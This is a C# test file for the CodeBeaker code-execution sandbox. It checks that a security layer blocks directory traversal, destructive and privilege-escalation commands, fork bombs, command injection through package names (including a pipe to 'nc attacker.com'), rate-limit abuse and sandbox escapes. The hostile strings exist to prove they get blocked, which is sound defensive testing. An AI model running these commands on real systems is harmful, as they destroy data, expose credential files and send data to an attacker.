using CodeBeaker.Commands.Models;
using CodeBeaker.Core.Interfaces;
using CodeBeaker.Core.Models;
using CodeBeaker.Core.Security;
using Microsoft.Extensions.Logging;
using Moq;
using Xunit;

namespace CodeBeaker.Integration.Tests;

/// <summary>
/// Security attack simulation tests
/// Tests real-world attack scenarios to verify security defenses
/// Phase 11: Production Hardening
/// </summary>
public sealed class SecurityAttackSimulationTests
{
    #region Directory Traversal Attacks

    [Theory]
    [InlineData("../../../etc/passwd")]
    [InlineData("..\\..\\..\\windows\\system32\\config\\sam")]
    [InlineData("/etc/passwd")]
    [InlineData("C:\\Windows\\System32\\config\\sam")]
    public async Task ShouldBlock_DirectoryTraversalAttempts(string maliciousPath)
    {
        // Arrange
        var secureEnv = CreateSecureEnvironment();
        var command = new ReadFileCommand { Path = maliciousPath };

        // Act
        var result = await secureEnv.ExecuteAsync(command, CancellationToken.None);

        // Assert
        Assert.False(result.Success, $"Directory traversal not blocked: {maliciousPath}");
        Assert.NotNull(result.Error);
    }

    #endregion

    #region Command Injection Attacks

    [Theory]
    [InlineData("rm -rf /")]
    [InlineData("dd if=/dev/zero of=/dev/sda")]
    [InlineData("mkfs.ext4 /dev/sda1")]
    [InlineData("sudo rm -rf /")]
    [InlineData("su root")]
    public async Task ShouldBlock_DangerousSystemCommands(string dangerousCommand)
    {
        // Arrange
        var secureEnv = CreateSecureEnvironment();
        var command = new ExecuteCodeCommand { Code = dangerousCommand };

        // Act
        var result = await secureEnv.ExecuteAsync(command, CancellationToken.None);

        // Assert
        Assert.False(result.Success, $"Dangerous command not blocked: {dangerousCommand}");
        Assert.Contains("blocked pattern", result.Error);
    }

    [Theory]
    [InlineData("express; rm -rf /")]
    [InlineData("lodash && cat /etc/passwd")]
    [InlineData("axios | nc attacker.com 1234")]
    [InlineData("express `whoami`")]
    [InlineData("express$HOME")]
    public async Task ShouldBlock_PackageInstallInjection(string maliciousPackage)
    {
        // Arrange
        var secureEnv = CreateSecureEnvironment();
        var command = new InstallPackagesCommand
        {
            Packages = new List<string> { maliciousPackage }
        };

        // Act
        var result = await secureEnv.ExecuteAsync(command, CancellationToken.None);

        // Assert
        Assert.False(result.Success, $"Package injection not blocked: {maliciousPackage}");
        Assert.Contains("invalid characters", result.Error);
    }

    #endregion

    #region Fork Bomb Attacks

    [Theory]
    [InlineData(":(){ :|:& };:")]
    [InlineData("fork(){ fork|fork& }; fork")]
    [InlineData(".(){.|.&};.")]
    public async Task ShouldBlock_ForkBombAttempts(string forkBomb)
    {
        // Arrange
        var secureEnv = CreateSecureEnvironment();
        var command = new ExecuteCodeCommand { Code = forkBomb };

        // Act
        var result = await secureEnv.ExecuteAsync(command, CancellationToken.None);

        // Assert
        Assert.False(result.Success, $"Fork bomb not blocked: {forkBomb}");
    }

    #endregion

    #region DoS Attacks

    [Fact]
    public async Task ShouldBlock_RateLimitDoS()
    {
        // Arrange
        var config = new SecurityConfig
        {
            EnableRateLimiting = true,
            ExecutionsPerMinute = 5
        };
        var secureEnv = CreateSecureEnvironment(config);
        var command = new ExecuteCodeCommand { Code = "console.log('test');" };

        // Act - Attempt rapid-fire executions (DoS attempt)
        var results = new List<CommandResult>();
        for (int i = 0; i < 10; i++)
        {
            results.Add(await secureEnv.ExecuteAsync(command, CancellationToken.None));
        }

        // Assert
        var successCount = results.Count(r => r.Success);
        var blockedCount = results.Count(r => !r.Success);

        Assert.Equal(5, successCount); // Only 5 should succeed
        Assert.Equal(5, blockedCount); // 5 should be rate-limited
        Assert.All(results.Skip(5), r => Assert.Contains("Rate limit", r.Error));
    }

    [Fact]
    public async Task ShouldTruncate_MemoryExhaustionAttempt()
    {
        // Arrange
        var config = new SecurityConfig
        {
            EnableInputValidation = true,
            MaxOutputLength = 1000
        };

        // Create massive output (memory exhaustion attempt)
        var massiveOutput = new string('A', 100_000);
        var mockEnv = CreateMockEnvironment(massiveOutput);

        var rateLimiter = new RateLimiter(config);
        var auditLogger = CreateAuditLogger(config);
        var logger = CreateLogger<SecurityEnhancedEnvironment>();

        var secureEnv = new SecurityEnhancedEnvironment(
            mockEnv.Object, config, rateLimiter, auditLogger, logger, "D:\\workspace");

        var command = new ExecuteCodeCommand { Code = "console.log('x'.repeat(100000));" };

        // Act
        var result = await secureEnv.ExecuteAsync(command, CancellationToken.None);

        // Assert
        Assert.True(result.Success);
        var outputLength = result.Result?.ToString()?.Length ?? 0;
        Assert.True(outputLength < massiveOutput.Length);
        Assert.Contains("truncated", result.Result?.ToString() ?? "");
    }

    [Fact]
    public async Task ShouldBlock_CodeBombAttempt()
    {
        // Arrange
        var config = new SecurityConfig
        {
            EnableInputValidation = true,
            MaxCodeLength = 10_000
        };
        var secureEnv = CreateSecureEnvironment(config);

        // Attempt to send massive code (code bomb)
        var massiveCode = new string('a', 100_001);
        var command = new ExecuteCodeCommand { Code = massiveCode };

        // Act
        var result = await secureEnv.ExecuteAsync(command, CancellationToken.None);

        // Assert
        Assert.False(result.Success);
        Assert.Contains("exceeds maximum length", result.Error);
    }

    #endregion

    #region Privilege Escalation Attempts

    [Theory]
    [InlineData("sudo apt-get install malware")]
    [InlineData("su - root")]
    [InlineData("sudo -i")]
    [InlineData("sudo su")]
    public async Task ShouldBlock_PrivilegeEscalation(string escalationCommand)
    {
        // Arrange
        var secureEnv = CreateSecureEnvironment();
        var command = new ExecuteCodeCommand { Code = escalationCommand };

        // Act
        var result = await secureEnv.ExecuteAsync(command, CancellationToken.None);

        // Assert
        Assert.False(result.Success, $"Privilege escalation not blocked: {escalationCommand}");
        Assert.Contains("blocked pattern", result.Error);
    }

    #endregion

    #region Data Exfiltration Attempts

    [Theory]
    [InlineData("/etc/passwd")]
    [InlineData("/etc/shadow")]
    [InlineData("C:\\Windows\\System32\\config\\SAM")]
    [InlineData("/proc/self/environ")]
    public async Task ShouldBlock_SensitiveFileAccess(string sensitivePath)
    {
        // Arrange
        var secureEnv = CreateSecureEnvironment();
        var command = new ReadFileCommand { Path = sensitivePath };

        // Act
        var result = await secureEnv.ExecuteAsync(command, CancellationToken.None);

        // Assert
        Assert.False(result.Success, $"Sensitive file access not blocked: {sensitivePath}");
    }

    #endregion

    #region Sandbox Escape Attempts

    [Fact]
    public async Task ShouldEnforce_WorkspaceRestriction()
    {
        // Arrange
        var config = new SecurityConfig
        {
            EnableInputValidation = true,
            SandboxRestrictFilesystem = true
        };
        var secureEnv = CreateSecureEnvironment(config);

        // Attempt to access file outside workspace
        var command = new WriteFileCommand
        {
            Path = "D:\\other\\malicious.js",
            Content = "malicious code"
        };

        // Act
        var result = await secureEnv.ExecuteAsync(command, CancellationToken.None);

        // Assert
        Assert.False(result.Success);
        Assert.Contains("within workspace", result.Error);
    }

    [Fact]
    public async Task ShouldBlock_ShellCommands_InStrictSandbox()
    {
        // Arrange
        var config = new SecurityConfig
        {
            EnableInputValidation = true,
            SandboxDisableShellCommands = true
        };
        var secureEnv = CreateSecureEnvironment(config);

        var command = new ExecuteShellCommand
        {
            CommandName = "bash",
            Args = new List<string> { "-c", "echo hello" }
        };

        // Act
        var result = await secureEnv.ExecuteAsync(command, CancellationToken.None);

        // Assert
        Assert.False(result.Success);
        Assert.Contains("disabled", result.Error);
    }

    #endregion

    #region Multi-Vector Attacks

    [Fact]
    public async Task ShouldDefend_CombinedAttack()
    {
        // Arrange - Strict security
        var config = new SecurityConfig
        {
            EnableInputValidation = true,
            EnableRateLimiting = true,
            ExecutionsPerMinute = 10,
            SandboxRestrictFilesystem = true,
            SandboxDisableShellCommands = true
        };
        var secureEnv = CreateSecureEnvironment(config);

        // Act - Try multiple attack vectors
        var attacks = new List<Command>
        {
            new ExecuteCodeCommand { Code = "rm -rf /" },
            new ReadFileCommand { Path = "../../../etc/passwd" },
            new InstallPackagesCommand { Packages = new List<string> { "pkg; rm -rf /" } },
            new WriteFileCommand { Path = "D:\\other\\file.txt", Content = "data" },
            new ExecuteShellCommand { CommandName = "bash", Args = new List<string>() }
        };

        var results = new List<CommandResult>();
        foreach (var attack in attacks)
        {
            results.Add(await secureEnv.ExecuteAsync(attack, CancellationToken.None));
        }

        // Assert - All attacks should be blocked
        Assert.All(results, r => Assert.False(r.Success));
    }

    #endregion

    #region Audit Trail Verification

    [Fact]
    public async Task ShouldLog_AllSecurityViolations()
    {
        // Arrange
        var config = new SecurityConfig
        {
            EnableInputValidation = true,
            EnableAuditLogging = true
        };
        var mockEnv = CreateMockEnvironment();
        var rateLimiter = new RateLimiter(config);
        var auditLogger = CreateAuditLogger(config);
        var logger = CreateLogger<SecurityEnhancedEnvironment>();

        var secureEnv = new SecurityEnhancedEnvironment(
            mockEnv.Object, config, rateLimiter, auditLogger, logger, "D:\\workspace");

        // Act - Attempt various attacks
        await secureEnv.ExecuteAsync(new ExecuteCodeCommand { Code = "rm -rf /" }, CancellationToken.None);
        await secureEnv.ExecuteAsync(new ReadFileCommand { Path = "../../etc/passwd" }, CancellationToken.None);

        var violations = auditLogger.GetSecurityViolations();

        // Assert - All violations should be logged
        Assert.Equal(2, violations.Count);
        Assert.All(violations, v => Assert.Equal(AuditEventType.SecurityViolation, v.EventType));
        Assert.All(violations, v => Assert.Equal(AuditSeverity.Error, v.Severity));
    }

    #endregion

    // Helper methods

    private SecurityEnhancedEnvironment CreateSecureEnvironment(SecurityConfig? config = null)
    {
        config ??= new SecurityConfig
        {
            EnableInputValidation = true,
            EnableRateLimiting = true,
            EnableAuditLogging = true,
            SandboxRestrictFilesystem = true
        };

        var mockEnv = CreateMockEnvironment();
        var rateLimiter = new RateLimiter(config);
        var auditLogger = CreateAuditLogger(config);
        var logger = CreateLogger<SecurityEnhancedEnvironment>();

        return new SecurityEnhancedEnvironment(
            mockEnv.Object, config, rateLimiter, auditLogger, logger, "D:\\workspace");
    }

    private Mock<IExecutionEnvironment> CreateMockEnvironment(string? customOutput = null)
    {
        var mock = new Mock<IExecutionEnvironment>();
        mock.Setup(e => e.EnvironmentId).Returns("test-env");
        mock.Setup(e => e.RuntimeType).Returns(RuntimeType.NodeJs);
        mock.Setup(e => e.State).Returns(EnvironmentState.Ready);

        mock.Setup(e => e.ExecuteAsync(It.IsAny<Command>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new CommandResult
            {
                Success = true,
                Result = customOutput ?? "output",
                DurationMs = 100
            });

        mock.Setup(e => e.GetResourceUsageAsync(It.IsAny<CancellationToken>()))
            .ReturnsAsync((ResourceUsage?)null);

        return mock;
    }

    private AuditLogger CreateAuditLogger(SecurityConfig config)
    {
        var mockLogger = new Mock<ILogger<AuditLogger>>();
        return new AuditLogger(mockLogger.Object, config);
    }

    private ILogger<T> CreateLogger<T>()
    {
        var mockLogger = new Mock<ILogger<T>>();
        return mockLogger.Object;
    }
}
